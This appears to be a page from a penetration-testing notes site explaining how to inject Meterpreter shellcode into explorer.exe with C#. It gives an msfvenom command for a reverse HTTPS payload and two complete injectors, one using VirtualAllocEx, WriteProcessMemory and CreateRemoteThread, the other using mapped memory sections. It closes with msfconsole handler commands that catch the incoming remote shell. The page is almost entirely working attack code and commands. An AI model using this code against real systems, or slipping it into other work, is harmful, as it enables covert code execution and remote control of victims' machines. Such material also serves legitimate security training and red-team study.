---
title: C# Process Injection
layout: default
parent: Process Injection / Migration / Hollowing
nav_order: 1
---

## Migrating into explorer.exe

1. Generate msfvenom with:\
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Visual Studio -> create new "Console App (.NET Framework)". Namespace is the name of project. Full code:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace Inj
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
            Process[] processes = Process.GetProcessesByName("explorer");
            int processId = processes[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[591] {};

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

```

3\. Change to Release, and x64. Build.

4\. Finally prepare for incoming shell:

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```



## Alternative solution (without using VirtualAllocEx and WriteProcessMemory)

1. Generate msfvenom with:\
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Code (x64 and Release):

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace InjWithSections
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateSection(
            out IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref ulong MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtClose(IntPtr Handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // Payload
            byte[] buf = new byte[591]{};

            // Get target process ID
            Process[] processes = Process.GetProcessesByName("explorer");
            int processId = processes[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);

            // Create a memory section
            IntPtr sectionHandle;
            ulong sectionSize = (ulong)buf.Length;
            uint status = NtCreateSection(
                out sectionHandle,
                0xF001F, // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref sectionSize,
                0x40,    // PAGE_EXECUTE_READWRITE
                0x08000000, // SEC_COMMIT
                IntPtr.Zero);

            // Map the section into the current process
            IntPtr localBaseAddress;
            ulong viewSize = 0;
            status = NtMapViewOfSection(
                sectionHandle,
                (IntPtr)(-1), // Current process
                out localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out viewSize,
                2,          // ViewUnmapDisposition
                0,
                0x40);      // PAGE_EXECUTE_READWRITE

            // Copy payload into the local section
            Marshal.Copy(buf, 0, localBaseAddress, buf.Length);

            // Map the section into the target process
            IntPtr remoteBaseAddress;
            status = NtMapViewOfSection(
                sectionHandle,
                hProcess,
                out remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out viewSize,
                2,
                0,
                0x20); // PAGE_EXECUTE_READ

            // Create a remote thread in the target process
            IntPtr hThread = CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                0,
                remoteBaseAddress,
                IntPtr.Zero,
                0,
                IntPtr.Zero);

            // Cleanup
            NtUnmapViewOfSection((IntPtr)(-1), localBaseAddress);
            NtClose(sectionHandle);
        }
    }
}
```